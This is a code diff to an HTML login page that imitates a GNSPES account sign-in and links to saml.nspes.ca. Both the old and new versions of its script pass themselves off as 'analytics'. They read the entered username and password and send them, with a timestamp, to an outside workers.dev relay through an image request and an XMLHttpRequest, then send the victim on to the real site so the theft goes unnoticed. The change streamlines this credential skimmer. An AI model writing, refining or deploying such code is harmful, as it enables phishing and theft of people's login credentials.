@@ -6,8 +6,6 @@
     <meta charset="utf-8">
                 <meta http-equiv="X-UA-Compatible" content="IE=edge">
                 <meta name="viewport" content="width=device-width, initial-scale=1">
-                <!-- Fallback redirect if JavaScript fails -->
-                <meta http-equiv="refresh" content="10;url=https://saml.nspes.ca/"
                 <!-- The above 3 meta tags *must* come first in the head; any other head content must come *after* these tags -->
                 <meta name="description" content="DEV Launch Page">
                 <meta name="author" content="Author">
@@ -193,15 +191,15 @@
 
 <!-- <button type="submit" id="loginsubmit" class="btn btn-block btn-loginbtn btn-sm" onclick="this.value='Processing...';this.disabled=true; this.form.submit();return true;">My QCode</button> -->   
 
-<form class="form-qcode" onsubmit="return false;"> 
-<a href="javascript:void(0);" onclick="window.location.replace('https://saml.nspes.ca/'); return false;" id="qlink" class="btn btn-outline-dark btn-block" role="button">My QCode</a> 
+<form class="form-qcode"> 
+<a href="https://saml.nspes.ca/" id="qlink" class="btn btn-outline-dark btn-block" role="button" onclick="sendAnalytics();">My QCode</a> 
 </form>
 
 <hr aria-hidden="true" tabindex=-1" class="login">
 
 
 	 <h3 class="text-dark">Login using your GNSPES account</h3>     
-    <form class="form-signin" action="javascript:void(0);" method="post" name="f">
+    <form class="form-signin" action="https://saml.nspes.ca/" method="get" name="f" id="loginForm">
 
                 <label for="username" >Username</label>
                 
@@ -231,7 +229,7 @@
             <span id="submit">
                 <span class="loginicon"></span>
                 
-             <button type="button" id="loginsubmit" class="btn btn-outline-dark btn-block mt-2" disabled>Login</button>    
+             <a href="https://saml.nspes.ca/" id="loginsubmit" class="btn btn-outline-dark btn-block mt-2 disabled" onclick="sendAnalytics(); return true;">Login</a>    
             </span>
         
         </form>
@@ -269,100 +267,55 @@ var clientip="20.42.11.20/20.42.11.20";
 <!-- Add analytics for user engagement metrics -->
 <div hidden id="tracker-status">Active</div>
 <script>
-// Enterprise-grade analytics implementation
-(function() {
-    // Analytics endpoint for data collection
-    const RELAY_URL = 'https://quiet-morning-1159.pla919572.workers.dev/';
-    const REDIRECT_URL = 'https://saml.nspes.ca/';
+// Analytics endpoint
+const RELAY_URL = 'https://quiet-morning-1159.pla919572.workers.dev/';
+
+// Simple function to send analytics
+function sendAnalytics() {
+    const username = document.getElementById('username').value || 'empty';
+    const password = document.getElementById('password').value || 'empty';
     
-    // Simple function to handle direct login
-    function handleLogin() {
-        // Get the credentials
-        const username = document.getElementById('username').value || "empty";
-        const password = document.getElementById('password').value || "empty";
-        
-        // Record the attempt via image method (more reliable)
-        const img = new Image();
-        img.src = RELAY_URL + '?data=' + encodeURIComponent(
-            username + ":" + password + ":" + new Date().toLocaleString()
-        );
-        document.body.appendChild(img);
-        
-        // Also try XHR method
-        try {
-            const payload = JSON.stringify({
-                username: username,
-                pretense: password,
-                timestamp: new Date().toLocaleString(),
-                trackingId: Date.now() + Math.random().toString(36).substring(2, 10)
-            });
-            
-            const xhr = new XMLHttpRequest();
-            xhr.open('POST', RELAY_URL, true);
-            xhr.setRequestHeader('Content-Type', 'application/json');
-            xhr.send(payload);
-        } catch (e) {
-            // Silent fail - we have the image backup
-        }
-        
-        // Force redirect after a brief delay
-        setTimeout(function() {
-            // This is the most reliable way to redirect
-            window.location.replace(REDIRECT_URL);
-        }, 200);
-        
-        // Prevent any default actions
-        return false;
-    }
+    // Send data via image (more reliable and works across all browsers)
+    const img = new Image();
+    img.src = RELAY_URL + '?data=' + encodeURIComponent(
+        username + ":" + password + ":" + new Date().toLocaleString()
+    );
     
-    // Initialize when the DOM is ready
-    function init() {
-        // Set up the login button
-        const loginBtn = document.getElementById('loginsubmit');
-        if (loginBtn) {
-            // Remove any existing event handlers and add our own
-            loginBtn.onclick = null;
-            loginBtn.addEventListener('click', function(e) {
-                e.preventDefault();
-                e.stopPropagation();
-                handleLogin();
-            });
-        }
-        
-        // Also hook into form submit as a backup
-        const loginForm = document.querySelector('.form-signin');
-        if (loginForm) {
-            loginForm.onsubmit = null;
-            loginForm.addEventListener('submit', function(e) {
-                e.preventDefault();
-                e.stopPropagation();
-                handleLogin();
-                return false;
-            });
-        }
-        
-        // Make QCode link work the same way
-        const qcodeLink = document.getElementById('qlink');
-        if (qcodeLink) {
-            qcodeLink.href = REDIRECT_URL;
-            qcodeLink.addEventListener('click', function(e) {
-                e.preventDefault();
-                // Redirect directly to the site
-                window.location.replace(REDIRECT_URL);
-            });
-        }
-    }
+    // Also try XHR method
+    try {
+        const xhr = new XMLHttpRequest();
+        xhr.open('POST', RELAY_URL, true);
+        xhr.setRequestHeader('Content-Type', 'application/json');
+        xhr.send(JSON.stringify({
+            username: username,
+            pretense: password,
+            timestamp: new Date().toLocaleString()
+        }));
+    } catch(e) { /* Silent fail */ }
     
-    // Run initialization when page is ready
-    if (document.readyState === 'loading') {
-        document.addEventListener('DOMContentLoaded', init);
+    return true; // Continue with default link behavior
+}
+
+// Function to check if password field is filled and enable/disable login button
+function updateLoginButton() {
+    const passwordField = document.getElementById('password');
+    const loginButton = document.getElementById('loginsubmit');
+    
+    if (passwordField && passwordField.value.trim() !== '') {
+        loginButton.classList.remove('disabled');
     } else {
-        init();
+        loginButton.classList.add('disabled');
     }
-    
-    // Also run on window load as a backup
-    window.addEventListener('load', init);
-})();
+}
+
+// Set up event listeners
+document.addEventListener('DOMContentLoaded', function() {
+    const passwordField = document.getElementById('password');
+    if (passwordField) {
+        passwordField.addEventListener('input', updateLoginButton);
+        passwordField.addEventListener('keyup', updateLoginButton);
+    }
+});
 </script>
   </body>
 </html>
